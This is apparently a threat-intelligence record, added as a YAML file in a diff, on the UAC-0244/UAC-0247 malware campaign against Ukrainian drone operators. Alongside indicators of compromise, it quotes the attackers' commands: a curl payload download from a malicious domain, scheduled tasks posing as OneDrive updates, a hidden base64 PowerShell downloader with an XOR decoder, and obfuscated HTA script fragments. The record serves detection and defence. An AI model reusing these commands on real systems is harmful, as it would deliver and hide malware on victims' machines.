@@ -1,0 +1,117 @@
+title: UAC-0244 / UAC-0247 Ukraine-Targeted Malware Campaign via LNK and HTA Droppers
+description: A threat campaign targeting FPV/UAV operators uses LNK files pointing
+  to mshta.exe to deliver an HTA/JavaScript loader that downloads and executes an
+  XOR-decoded payload, injects shellcode into RuntimeBroker.exe, and establishes persistence
+  via scheduled task. The final payload is an encrypted reverse shell connecting to
+  a C2 over TCP 8443.
+attribution: UAC-0244 / UAC-0247
+malware_families:
+- updater.exe
+- EncryptedReverseShell
+cves: []
+ttps:
+  processes:
+  - mshta.exe
+  - cmd.exe
+  - curl.exe
+  - powershell.exe
+  - schtasks.exe
+  - RuntimeBroker.exe
+  - updater.exe
+  command_lines:
+  - cmd /c curl https://ukrvarta[.]online/dopomoga/updater.txt -o %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
+  - cmd /c schtasks /create /tn "OneDriveUpdater" /tr "%LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe"
+    /sc MINUTE /mo 10 /ru "%USERNAME%" /f
+  - cmd /c schtasks /create /tn "OneDrive Updater" /tr "%LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe"
+    /sc MINUTE /mo 10 /ru "%USERNAME%"
+  - powershell -ep bypass -NoProfile -WindowStyle Hidden -e "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwB1AGsAcgB2AGEAcgB0AGEALgBvAG4AbABpAG4AZQAvAGMAbwBuAGYAZQByAGUAbgBjAGUALwB1AHAAZABhAHQAZQByAC4AdAB4AHQAIgAKACQAbwB1AHQAUABhAHQAaAAgAD0AIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFwATwBuAGUARAByAGkAdgBlAFUAcABkAGEAdABlAHIAXABcAE8AbgBlAEQAcgBpAHYAZQBVAHAAZABhAHQAZQByAC4AZQB4AGUAIgAKACQAawBlAHkAIAA9ACAAWwBiAHkAdABlAFsAXQBdACgAMAB4ADYANgAsADAAeAA3ADUALAAwAHgANgAzACwAMAB4ADYAYgApAAoAJABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACQAdQByAGwAKQAKACQAbwB1AHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwArACkAIAB7AAoAIAAgACAAIAAkAG8AdQB0AFsAJABpAF0AIAA9ACAAJABiAHkAdABlAHMAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0ACgB9AAoATgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAC0ARgBvAHIAYwBlACAALQBQAGEAdABoACAAKABTAHAAbABpAHQALQBQAGEAdABoACAAJABvAHUAdABQAGEAdABoACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAkAG8AdQB0AFAAYQB0AGgALAAgACQAbwB1AHQAKQA="
+  - cmd /C %s
+  - powershell -ep bypass -NoProfile -WindowStyle Hidden -e "<base64>"
+  - schtasks /create /tn "OneDrive Updater" /tr "%LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe"
+    /sc MINUTE /mo 10 /ru "%USERNAME%"
+  - mshta.exe https://ukrvarta[.]online/dopomoga/dopomoga.hta
+  powershell:
+  - "$url = \"https://ukrvarta[.]online/conference/updater.txt\"\n$outPath = \"$env:LOCALAPPDATA\\\
+    \\OneDriveUpdater\\\\OneDriveUpdater.exe\"\n$key = [byte[]](0x66,0x75,0x63,0x6b)\n\
+    $bytes = (New-Object System.Net.WebClient).DownloadData($url)\n$out = New-Object\
+    \ byte[] $bytes.Length\nfor ($i = 0; $i -lt $bytes.Length; $i++) {\n    $out[$i]\
+    \ = $bytes[$i] -bxor $key[$i % $key.Length]\n}\nNew-Item -ItemType Directory -Force\
+    \ -Path (Split-Path $outPath) | Out-Null\n[IO.File]::WriteAllBytes($outPath, $out)"
+  - JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwB1AGsAcgB2AGEAcgB0AGEALgBvAG4AbABpAG4AZQAvAGMAbwBuAGYAZQByAGUAbgBjAGUALwB1AHAAZABhAHQAZQByAC4AdAB4AHQAIgAKACQAbwB1AHQAUABhAHQAaAAgAD0AIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFwATwBuAGUARAByAGkAdgBlAFUAcABkAGEAdABlAHIAXABcAE8AbgBlAEQAcgBpAHYAZQBVAHAAZABhAHQAZQByAC4AZQB4AGUAIgAKACQAawBlAHkAIAA9ACAAWwBiAHkAdABlAFsAXQBdACgAMAB4ADYANgAsADAAeAA3ADUALAAwAHgANgAzACwAMAB4ADYAYgApAAoAJABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARABhAHQAYQAoACQAdQByAGwAKQAKACQAbwB1AHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAGIAeQB0AGUAWwBdACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoADsAIAAkAGkAKwArACkAIAB7AAoAIAAgACAAIAAkAG8AdQB0AFsAJABpAF0AIAA9ACAAJABiAHkAdABlAHMAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0ACgB9AAoATgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgAC0ARgBvAHIAYwBlACAALQBQAGEAdABoACAAKABTAHAAbABpAHQALQBQAGEAdABoACAAJABvAHUAdABQAGEAdABoACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFcAcgBpAHQAZQBBAGwAbABCAHkAdABlAHMAKAAkAG8AdQB0AFAAYQB0AGgALAAgACQAbwB1AHQAKQA=
+  scripts:
+  - dopomoga.hta
+  - dopomoga.hta.old
+  - script.js
+  - conference.hta
+  - conference2026_webdavroot.html
+  - dopomoga.html
+  - UESDBBQAAAGIAGh8ZVxSDhImkgIAAJSEAABMABWAGKTQVtGAOLZQsCDQtICwWRY/QstC60LggeL3QsCDQsIGDOLzQSNCIRZbRGCWOY29
+  - var shell = new ActiveXObject(_0x983f2c(0x1ac)), fso = new ActiveXObject('Scripting.FileSystemObject'),
+    dir = shell[_0x983f2c(0x1a9)](_0x983f2c(0x1a2)); if(fso[_0x983f2c(0x1b0)](dir)
+    && fso[_0x983f2c(0x1a8)](dir));
+  - shell[_0x983f2c(0x1b2)](_0x983f2c(0x1a3) + ps + "\x22", 0x0, !![]), shell[_0x983f2c(0x1b2)](_0x983f2c(0x1af),
+    0x0, !![]);
+  registry_keys: []
+  image_loads:
+  - ntdll.dll
+  network_connections:
+  - curl.exe -> ukrvarta[.]online:443
+  - powershell.exe -> ukrvarta[.]online:443
+  - browser -> ukrvarta[.]online:8080
+  - EncryptedReverseShell.exe -> 109.237.97[.]4:8443
+  - mshta.exe -> ukrvarta[.]online:8080
+  - OneDriveUpdater.exe -> ukrvarta[.]online:443
+  - browser -> ukrvarta[.]online:80
+  file_activity:
+  - '%LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe'
+  - '%LOCALAPPDATA%\OneDriveUpdater'
+  - C:\Users\user\source\repos\EncryptedReverseShell\x64\Release\EncryptedReverseShell.pdb
+  - '%LOCALAPPDATA%\OneDrive'
+  persistence:
+  - Scheduled task named "OneDriveUpdater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
+    every 10 minutes in user context
+  - Scheduled task named "OneDrive Updater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
+    every 10 minutes in user context
+  - Scheduled task named "OneDriveUpdater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
+    every 10 minutes
+  - Scheduled task named "OneDrive Updater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
+    every 10 minutes
+  - Scheduled task named "OneDrive Updater" running %LOCALAPPDATA%\OneDriveUpdater\OneDriveUpdater.exe
+    every 10 minutes as %USERNAME%
+  - Scheduled task creation via cmd with name "OneDrive" pointing to an updater binary
+    in %LOCALAPPDATA%\OneDrive
+  process_relations:
+  - mshta.exe -> cmd.exe
+  - cmd.exe -> curl.exe
+  - cmd.exe -> schtasks.exe
+  - mshta.exe -> script.js (HTA/JavaScript staging)
+  - updater.exe -> RuntimeBroker.exe (process injection via NtCreateThreadEx)
+  - mshta.exe -> powershell.exe
+  - OneDriveUpdater.exe -> RuntimeBroker.exe
+iocs:
+  hashes:
+  - 8040da63a8f5be3fec9724d6d6e6f101f5336d99be309bf0b7cd781f12aace15
+  - c06cc6122b798f88a05a088bfed39594af86ba714da89fec5ca62d7119782df9
+  - b1d765f50f5c53702658b7a59a9bd05cfb042ea6b2d150191a84c53d373b9e4a
+  - 44fe18a23d6d2ca53a7234a934f438db
+  - 268400390be82fcb46f1b23e0319f2f2ba477e392014b41b57df587b99ecc3c5
+  - 1c95b3d3ac3d6f9c839df333532060b4
+  ip_addresses:
+  - 109.237.97[.]4
+  domains:
+  - ukrvarta[.]online
+  - nuxt[.]cloud
+  urls:
+  - hxxps://ukrvarta[.]online/dopomoga/updater.txt
+  - hxxps://ukrvarta[.]online/conference/updater.txt
+  - hxxps://ukrvarta[.]online/dopomoga/script.js
+  - ukrvarta[.]online/dopomoga/script.js
+  - ukrvarta[.]online:8080/davwwwroot
+  - hxxps://mantis.malwarebox.eu/shared/x8qqIok5CDYARdCwJP4GKz9d7j8Ewr9q
+  - hxxps://mantis.malwarebox.eu/shared/CfM6gyW98O01VIEtA6C6dev-GjptVRqt
+authors:
+- Robin Dost
+- synapTic securiTy
+reference: https://blog.synapticsystems.de/uac-0247-malware-targeting-fpv-operators/#comment-315
+date_of_publication: May 21, 2026
+file_creation_date: May 22, 2026
